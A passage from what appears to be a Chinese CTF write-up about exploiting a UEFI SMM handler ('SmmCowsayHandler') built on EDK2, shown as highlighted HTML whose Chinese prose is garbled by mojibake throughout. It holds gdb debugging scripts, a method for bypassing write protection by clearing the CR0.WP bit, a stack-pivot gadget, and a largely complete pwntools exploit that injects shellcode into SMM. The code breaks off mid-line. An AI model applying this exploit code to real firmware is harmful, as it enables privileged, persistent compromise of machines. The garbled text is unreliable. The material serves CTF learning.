class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AddAllSymbols</span>(gdb.Command):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span> (self):</span><br><span class="line">        <span class="built_in">super</span> (AddAllSymbols, self).__init__ (<span class="string">&#x27;add-all-symbols&#x27;</span>,</span><br><span class="line">            gdb.COMMAND_OBSCURE, gdb.COMPLETE_NONE, <span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">invoke</span>(<span class="params">self, args, from_tty</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Adding symbols for all EFI drivers...&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;debug.log&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">                <span class="keyword">if</span> line.startswith(<span class="string">&#x27;Loading SMM driver at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">4</span>]</span><br><span class="line">                <span class="keyword">elif</span> line.startswith(<span class="string">&#x27;Loading driver at&#x27;</span>) <span class="keyword">or</span> line.startswith(<span class="string">&#x27;Loading PEIM at&#x27;</span>):</span><br><span class="line">                    line = line.split()</span><br><span class="line">                    base = line[<span class="number">3</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                path = <span class="string">&#x27;../edk2_artifacts/&#x27;</span> + line[-<span class="number">1</span>].replace(<span class="string">&#x27;.efi&#x27;</span>, <span class="string">&#x27;.debug&#x27;</span>)</span><br><span class="line">                <span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">                    gdb.execute(<span class="string">&#x27;add-symbol-file &#x27;</span> + path + <span class="string">&#x27; -readnow -o &#x27;</span> + base)</span><br><span class="line"></span><br><span class="line">AddAllSymbols()</span><br></pre></td></tr></table></figure><p>script.gdbï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote :1234</span><br><span class="line"></span><br><span class="line"><span class="built_in">source</span> gdb_plugin.py</span><br><span class="line">add-all-symbols</span><br><span class="line"></span><br><span class="line">b *(SmmCowsayHandler + 770)</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>ä¼šåˆ°æ¼æ´åˆ©ç”¨ï¼Œèƒ½å¤ŸåŠ«æŒåæˆ‘ä»¬çš„é—®é¢˜å°±è½¬æ¢åˆ°è¦å¦‚ä½•è·å– flagã€‚å‰é¢æˆ‘ä»¬è¯´è¿‡ flag å¯¹åº”çš„ç‰©ç†é¡µè¢«è®¾ç½®æˆä¸å¯è¯»ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä¿®æ”¹ cr0 å¯„å­˜å™¨æ¥è®©ä»–å¯è¯»ã€‚æˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶ cr0 å¯„å­˜å™¨çš„å€¼ï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; i r cr0</span><br><span class="line">cr0            0x80010033          [ PG WP NE ET MP PE ]</span><br></pre></td></tr></table></figure><p>ä¸‹é¢æ¥è‡ª eastxuelian å¸ˆå‚…çš„è§£é‡Šï¼š  </p><blockquote><p>åœ¨å½“å‰çš„ CR0 è®¾ç½®ä¸­ï¼Œå¼€å¯çš„ä¿æŠ¤åŒ…æ‹¬ï¼š</p><p>åˆ†é¡µæœºåˆ¶ (PG)ï¼Œå…è®¸è™šæ‹Ÿå†…å­˜ç®¡ç†ã€‚<br>å†™ä¿æŠ¤ (WP)ï¼Œä¿æŠ¤å†…å­˜é¡µé¢å…äºéæ³•å†™å…¥ï¼Œå¢å¼ºå®‰å…¨æ€§ã€‚<br>ä¿æŠ¤æ¨¡å¼ (PE)ï¼Œæä¾›å†…å­˜æ®µä¿æŠ¤å’Œæƒé™åˆ†çº§ã€‚<br>åœ¨ x86 æ¶æ„ä¸­ï¼ŒCR0 å¯„å­˜å™¨çš„ WP ä½ç›´æ¥æ§åˆ¶å†™ä¿æŠ¤ï¼ˆWriteProtectï¼‰ï¼Œè€Œè¯»ä¿æŠ¤ï¼ˆReadProtectï¼‰é€šå¸¸ä¸æ˜¯ç”± CR0 ç›´æ¥æ§åˆ¶ã€‚</p><p>è¯»å–è®¿é—®çš„ä¿æŠ¤é€šå¸¸æ˜¯é€šè¿‡é¡µè¡¨ä¸­çš„æƒé™ä½æ¥æ§åˆ¶çš„ï¼Œè¿™äº›ä½å®šä¹‰å“ªäº›è¿›ç¨‹å¯ä»¥è¯»å–ç‰¹å®šçš„å†…å­˜é¡µã€‚ä¾‹å¦‚ï¼Œé¡µè¡¨ä¸­çš„æŸäº›ä½å¯ä»¥è®¾ç½®æˆå…è®¸æˆ–ç¦æ­¢ç”¨æˆ·æ¨¡å¼çš„ä»£ç è¯»å–ç‰¹å®šçš„å†…å­˜é¡µé¢ã€‚</p><p>å†™ä¿æŠ¤å¯ä»¥ç›´æ¥æŠŠ cr0 çš„ç¬¬ 16 ä½è®¾ç½®ä¸º 0 æ¥ç»•è¿‡ï¼Œæ¥ä¸‹æ¥å°±å¯ä»¥éšæ„ç¯¡æ”¹é¡µè¡¨é¡¹æˆ–è€…ä»£ç æ®µäº†ï¼Œå‰è€…å¯ä»¥å®Œæˆåç»­åˆ©ç”¨è€Œåè€…å¯ä»¥å¾€ä»£ç æ®µå†™å…¥ shellcodeï¼ˆNX ä¿æŠ¤ä¸ EFER å¯„å­˜å™¨ã€é¡µè¡¨é¡¹æœ‰å…³ï¼‰</p></blockquote><p>æˆ‘ä»¬å¯ä»¥é€šè¿‡ rop æ¥å®ç°è¿™ä¸ªæ“ä½œï¼Œå¯æ˜¯æˆ‘ä»¬çš„æ“ä½œéå¸¸çš„æœ‰é™ï¼Œå› ä¸ºåªæœ‰ä¸€æ¬¡ä»»æ„åœ°å€ callï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±éœ€è¦æƒ³åŠæ³•æ ˆè¿ç§»ã€‚è¿™é‡Œæˆ‘é€‰æ‹©ä½¿ç”¨ä¸€ä¸ªæ¯”è¾ƒç®€å•çš„æ ˆè¿ç§»æ–¹å¼ï¼Œåœ¨ UEFI ä¸­å­˜åœ¨ä¸€ä¸ªç±»ä¼¼äº kernel çš„ pt_regs ç»“æ„ã€‚<br>æˆ‘ä»¬å¯ä»¥å†™ä¸ªç®€å•çš„ shellcode æ¥éªŒè¯ä¸€ä¸‹ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">payload  = <span class="string">b&#x27;a&#x27;</span> * <span class="number">400</span> + p64(<span class="number">0xdeadbeafdeadbeaf</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    /* Copy data into allocated buffer */</span></span><br><span class="line"><span class="string">    lea rsi, qword ptr [rip + data]</span></span><br><span class="line"><span class="string">    mov rdi, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;<span class="number">0x18</span> + <span class="built_in">len</span>(payload)&#125;</span></span></span><br><span class="line"><span class="string">    cld</span></span><br><span class="line"><span class="string">    rep movsb</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /* Communicate(mSmmCommunication, buffer, NULL) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;mSmmCommunication&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, <span class="subst">&#123;buffer&#125;</span></span></span><br><span class="line"><span class="string">    xor r8, r8</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;Communicate&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rdi, 0x1111111111111111</span></span><br><span class="line"><span class="string">    mov rsi, 0x2222222222222222</span></span><br><span class="line"><span class="string">    mov rdi, 0x3333333333333333</span></span><br><span class="line"><span class="string">    mov rbp, 0x4444444444444444</span></span><br><span class="line"><span class="string">    mov r9 , 0x5555555555555555</span></span><br><span class="line"><span class="string">    mov r10, 0x6666666666666666</span></span><br><span class="line"><span class="string">    mov r11, 0x7777777777777777</span></span><br><span class="line"><span class="string">    mov r12, 0x8888888888888888</span></span><br><span class="line"><span class="string">    mov r13, 0x9999999999999999</span></span><br><span class="line"><span class="string">    mov r14, 0xaaaaaaaaaaaaaaaa</span></span><br><span class="line"><span class="string">    mov r15, 0xbbbbbbbbbbbbbbbb</span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">data:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCowsayCommunicationGuid&#125;</span> /* Buffer-&gt;HeaderGuid */</span></span><br><span class="line"><span class="string">    .quad <span class="subst">&#123;<span class="built_in">len</span>(payload)&#125;</span>                   /* Buffer-&gt;MessageLength */</span></span><br><span class="line"><span class="string">    /* payload will be appended here to serve as Buffer-&gt;Data */</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + payload.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ° r13ã€r14ã€r15 çš„å€¼ç»™ä¿å­˜åˆ°æ ˆä¸Š  </p><img src="/2024/12/14/uefi/22.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>æˆ‘ä»¬å†æ¥çœ‹ä¸€ä¸‹è°ƒç”¨å®Œå‡½æ•°æŒ‡é’ˆåç¨‹åºä¼šå¦‚ä½•æ‰§è¡Œï¼š  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/30i 0x7ee8fc3+0x302</span><br><span class="line">=&gt; 0x7ee92c5 &lt;SmmCowsayHandler+770&gt;:    call   rax</span><br><span class="line">   0x7ee92c7 &lt;SmmCowsayHandler+772&gt;:    <span class="built_in">test</span>   bl,bl</span><br><span class="line">   0x7ee92c9 &lt;SmmCowsayHandler+774&gt;:    je     0x7ee92f7 &lt;SmmCowsayHandler+820&gt;</span><br><span class="line">   0x7ee92cb &lt;SmmCowsayHandler+776&gt;:    lea    rdx,[rip+0x1bbb]        <span class="comment"># 0x7eeae8d &lt;@IoWriteFifo32_Done+1851&gt;</span></span><br><span class="line">   0x7ee92d2 &lt;SmmCowsayHandler+783&gt;:    mov    ecx,0x40</span><br><span class="line">   0x7ee92d7 &lt;SmmCowsayHandler+788&gt;:    call   0x7ee8f5e &lt;DebugPrint&gt;</span><br><span class="line">   0x7ee92dc &lt;SmmCowsayHandler+793&gt;:    jmp    0x7ee92f7 &lt;SmmCowsayHandler+820&gt;</span><br><span class="line">   0x7ee92de &lt;SmmCowsayHandler+795&gt;:    mov    r9,r13</span><br><span class="line">   0x7ee92e1 &lt;SmmCowsayHandler+798&gt;:    mov    r8,r12</span><br><span class="line">   0x7ee92e4 &lt;SmmCowsayHandler+801&gt;:    mov    ecx,0x80000000</span><br><span class="line">   0x7ee92e9 &lt;SmmCowsayHandler+806&gt;:    lea    rdx,[rip+0x1bbe]        <span class="comment"># 0x7eeaeae &lt;@IoWriteFifo32_Done+1884&gt;</span></span><br><span class="line">   0x7ee92f0 &lt;SmmCowsayHandler+813&gt;:    call   0x7ee8f5e &lt;DebugPrint&gt;</span><br><span class="line">   0x7ee92f5 &lt;SmmCowsayHandler+818&gt;:    jmp    0x7ee92c7 &lt;SmmCowsayHandler+772&gt;</span><br><span class="line">   0x7ee92f7 &lt;SmmCowsayHandler+820&gt;:    add    rsp,0x40</span><br><span class="line">   0x7ee92fb &lt;SmmCowsayHandler+824&gt;:    xor    eax,eax</span><br><span class="line">   0x7ee92fd &lt;SmmCowsayHandler+826&gt;:    pop    rbx</span><br><span class="line">   0x7ee92fe &lt;SmmCowsayHandler+827&gt;:    pop    rsi</span><br><span class="line">   0x7ee92ff &lt;SmmCowsayHandler+828&gt;:    pop    rdi</span><br><span class="line">   0x7ee9300 &lt;SmmCowsayHandler+829&gt;:    pop    r12</span><br><span class="line">   0x7ee9302 &lt;SmmCowsayHandler+831&gt;:    pop    r13</span><br><span class="line">   0x7ee9304 &lt;SmmCowsayHandler+833&gt;:    ret</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åœ¨æœ€åé¢çš„ pop çš„æ—¶å€™ r14ã€r15 å¯„å­˜å™¨çš„å€¼è¢«ä¿ç•™ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å¯»æ‰¾ç±»ä¼¼äº add rspã€ret * è¿™æ ·å­çš„ gadget è¦†ç›–å‡½æ•°æŒ‡é’ˆï¼Œç„¶ååœ¨ r14ã€r15 å¯„å­˜å™¨ä¸­æ”¾ç½® gadget å°† rsp æ ˆè¿ç§»åˆ°æˆ‘ä»¬çš„ rop ä¸­ã€‚</p><p>é™¤äº†è¿™ç§æ–¹æ³•ï¼Œå…¶å® EDK2 ä¸­è¿˜å­˜åœ¨ä¸€äº›éå¸¸å¥½ç”¨çš„ <a href="https://github.com/tianocore/edk2/blob/86c8d69146310f24069701053a27153ae536ebba/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54">gadget</a>ï¼š  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mov     rbx, [rcx]</span><br><span class="line">mov     rsp, [rcx + 8]</span><br><span class="line">mov     rbp, [rcx + 0x10]</span><br><span class="line">mov     rdi, [rcx + 0x18]</span><br><span class="line">mov     rsi, [rcx + 0x20]</span><br><span class="line">mov     r12, [rcx + 0x28]</span><br><span class="line">mov     r13, [rcx + 0x30]</span><br><span class="line">mov     r14, [rcx + 0x38]</span><br><span class="line">mov     r15, [rcx + 0x40]</span><br><span class="line">; load non-volatile fp registers</span><br><span class="line">ldmxcsr [rcx + 0x50]</span><br><span class="line">movdqu  xmm6,  [rcx + 0x58]</span><br><span class="line">movdqu  xmm7,  [rcx + 0x68]</span><br><span class="line">movdqu  xmm8,  [rcx + 0x78]</span><br><span class="line">movdqu  xmm9,  [rcx + 0x88]</span><br><span class="line">movdqu  xmm10, [rcx + 0x98]</span><br><span class="line">movdqu  xmm11, [rcx + 0xA8]</span><br><span class="line">movdqu  xmm12, [rcx + 0xB8]</span><br><span class="line">movdqu  xmm13, [rcx + 0xC8]</span><br><span class="line">movdqu  xmm14, [rcx + 0xD8]</span><br><span class="line">movdqu  xmm15, [rcx + 0xE8]</span><br><span class="line">mov     rax, rdx               ; set return value</span><br><span class="line">jmp     qword [rcx + 0x48]</span><br></pre></td></tr></table></figure><p>å®ƒå¯ä»¥ç”¨ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å‘çš„å†…å­˜ä¸Šçš„ä¿¡æ¯è®¾ç½®å¥½ rsp ä¸å…¶å®ƒå¯„å­˜å™¨ï¼Œå†è·³è½¬åˆ°ç›®æ ‡åœ°å€ä¸Šï¼Œç®€ç›´æ˜¯æ ˆè¿ç§»çš„æ¢¦ä¸­æƒ… gadgetï¼ˆç¬‘  </p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><p>æœ€ç»ˆ exp å¦‚ä¸‹ï¼Œrop ç”¨çš„æ˜¯ Marco Bonelli å¸ˆå‚…çš„ï¼š  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">buf</span>):</span><br><span class="line">    log.success(<span class="string">f&#x27;\033[33m<span class="subst">&#123;buf&#125;</span>:<span class="subst">&#123;<span class="built_in">eval</span>(buf):#x&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Address of SystemTable: 0x&#x27;</span>)</span><br><span class="line">systemTable = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">codeAddr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;systemTable&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;codeAddr&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;systemTable&#125;</span></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rax + 96]</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax + 320]</span></span><br><span class="line"><span class="string">    mov rcx, qword ptr [rax + 64]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">BootServices = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">LocateProtocol = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RCX: 0x&#x27;</span>)</span><br><span class="line">AllocatePool = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;BootServices&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;LocateProtocol&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;AllocatePool&quot;</span>)</span><br><span class="line"></span><br><span class="line">gEfiSmmCommunicationProtocolGuid = <span class="number">0x32c3c5ac65db949d4cbd9dc6c68ed8e2</span></span><br><span class="line"></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* LocateProtocol(gEfiSmmCommunicationProtocolGuid, NULL, &amp;protocol) */</span></span><br><span class="line"><span class="string">    lea rcx, qword ptr [rip + guid]</span></span><br><span class="line"><span class="string">    xor rdx, rdx</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + protocol]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;LocateProtocol&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + protocol] /* mSmmCommunication */</span></span><br><span class="line"><span class="string">    mov rbx, qword ptr [rax]            /* mSmmCommunication-&gt;Communicate */</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">guid:</span></span><br><span class="line"><span class="string">    .octa <span class="subst">&#123;gEfiSmmCommunicationProtocolGuid&#125;</span></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">protocol:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RAX: 0x&#x27;</span>)</span><br><span class="line">mSmmCommunication = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;RBX: 0x&#x27;</span>)</span><br><span class="line">Communicate = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br><span class="line">lg(<span class="string">&quot;mSmmCommunication&quot;</span>)</span><br><span class="line">lg(<span class="string">&quot;Communicate&quot;</span>)</span><br><span class="line"></span><br><span class="line">EfiRuntimeServicesData = <span class="number">6</span></span><br><span class="line">code = asm(<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    /* AllocatePool(EfiRuntimeServicesData, 0x1000, &amp;buffer) */</span></span><br><span class="line"><span class="string">    mov rcx, <span class="subst">&#123;EfiRuntimeServicesData&#125;</span></span></span><br><span class="line"><span class="string">    mov rdx, 0x1000</span></span><br><span class="line"><span class="string">    lea r8, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    mov rax, <span class="subst">&#123;AllocatePool&#125;</span></span></span><br><span class="line"><span class="string">    call rax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    test rax, rax</span></span><br><span class="line"><span class="string">    jnz fail</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov rax, qword ptr [rip + buffer]</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">fail:</span></span><br><span class="line"><span class="string">    ud2</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">buffer:</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;code:&#x27;</span>)</span><br><span class="line">code = code.<span class="built_in">hex</span>().encode() + <span class="string">b&#x27;\ndone&#x27;</span></span><br><span class="line">p.sendline(code)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span 